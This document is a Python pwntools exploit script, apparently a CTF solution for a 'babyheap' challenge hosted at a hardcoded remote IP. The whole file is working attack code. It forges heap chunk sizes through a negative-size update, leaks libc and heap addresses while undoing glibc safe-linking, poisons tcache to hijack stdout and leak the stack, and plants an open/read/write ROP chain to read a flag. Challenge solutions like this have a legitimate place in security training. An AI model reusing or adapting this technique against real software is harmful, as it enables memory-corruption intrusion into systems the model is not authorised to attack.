from pwn import *
import sys
import time

#gdb pipe-ing client

# MANGLED = FD ^ (MANGLED >> 12)

def recover_safe_linking(mangled, lsb):
    result = 0x300
    result |= ((lsb ^ mangled) & 0xfff) << 12
    result |= ((result ^ mangled) & 0xfff000) << 12
    result |= ((result ^ mangled) & 0xfff000000) << 12
    return result

OPTIONS = {
		'binary' : './babyheap',
		'server' : '47.100.33.132',
		'port' : 2204,
		'libc': None
}

def rc():
	r.recvuntil(b": ")

def alloc(size, data):
	r.sendline(b'1')
	r.sendlineafter(b': ', str(size).encode())
	r.sendlineafter(b': ', data)
	rc()

def update(idx, size, data):
	r.sendline(b'2') 
	r.sendlineafter(b': ', str(idx).encode())
	r.sendlineafter(b': ', str(size).encode())
	r.sendlineafter(b': ', data)
	rc()

def delete(idx):
	r.sendline(b'3')
	r.sendlineafter(b': ', str(idx).encode())
	rc()

def view(idx):
	r.sendline(b'4')
	r.sendlineafter(b': ', str(idx).encode())
	r.recvuntil(b': ')
	data = r.recvuntil(b'1. Allo', drop=True)[:-1]
	rc()
	return data

# r = process("./babyheap")
r = remote("47.100.33.132", 2204)

rc()

alloc(0x10, b"AAAA") #0
alloc(0x10, b"BBBB") #1

alloc(0x500, b"CCCC") #2

alloc(0x18, b"DDDD") #3
alloc(0x18, b"EEEE") #4
alloc(0x18, b"flag") #5

fake_chunk = p64(0x0)*2 +  p64(0x0) + p64(0x531 + 0x20)

update(0, -1, fake_chunk)

delete(1)

alloc(0x10, b"FFFF") #1
libc_leek = u64(view(2)[:8])

print("libc_leek -> 0x{:x}".format(libc_leek))

alloc(0x10, b"GGGG") #6
alloc(0x10, b"HHHH") #7

delete(7) 
delete(6)

res = view(2)

heap = recover_safe_linking(u64(res[:8]), 0x300)
print(hex(heap))
libc_base = libc_leek - 0x219ce0
stdout = libc_base + 0x21a750
environ = 0x221200 + libc_base
print(hex(stdout))

# dupe onto stdout
delete(4)
delete(3)

alloc(0x4e0, "A"*0x4c0 + p64(0x0) + p64(0x21) + p64((heap >> 12) ^ stdout)) #3
alloc(0x18, "A") #4
p = p64(0xfbad1800) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8)
# print(hex(len(p)))
alloc(0x18, "A"*0x18) #6

update(6, -1, "A"*0x30 + p)

stack = u64(r.recv(8)) - 0x8 - 0x120
print(hex(stack))
rc()

alloc(0x50, "A") # 7
alloc(0x50, "B") # 8
alloc(0x50, "C") # 9
alloc(0x50, "D") # 10

delete(9)
delete(8)

update(7, -1, "A"*0x50 + p64(0x0) + p64(0x61) + p64(stack ^ (heap >> 12)))
alloc(0x50, "A") # 8

pop_rdi = libc_base + 0x000000000002a3e5 # pop rdi ; ret
pop_rsi = libc_base + 0x000000000002be51 # pop rsi ; ret
pop_rdx = libc_base + 0x0000000000090529 # pop rdx ; pop rbx ; ret
pop_rcx = libc_base + 0x000000000008c6bb # pop rcx ; ret
pop_r8 = libc_base + 0x0000000000165b76 # pop r8 ; mov eax, 1 ; ret
pop_rax = libc_base + 0x0000000000045eb0 # pop rax ; ret
syscall = libc_base + 0x91396

context.bits = 64
context.arch = "amd64"

ropchain = flat([
    0x0, pop_rdi, heap - 0x300 + 0x830,
    pop_rsi, 0,
    pop_rdx, 0, 0,
    pop_rax, 2,
    syscall,

    pop_rdi, 0x3,
    pop_rsi, heap - 0x300 + 0x3000,
    pop_rdx, 0x100, 0x0,
    pop_rax, 0x0,
    syscall,

    pop_rdi, 0x1,
    pop_rsi, heap - 0x300 + 0x3000,
    pop_rdx, 0x100, 0x0,
    pop_rax, 0x1,
    syscall

])

alloc(0x50, p64(0x0)) # 9
update(9, -1, ropchain)
r.sendline("")
r.sendline("5")

r.interactive()


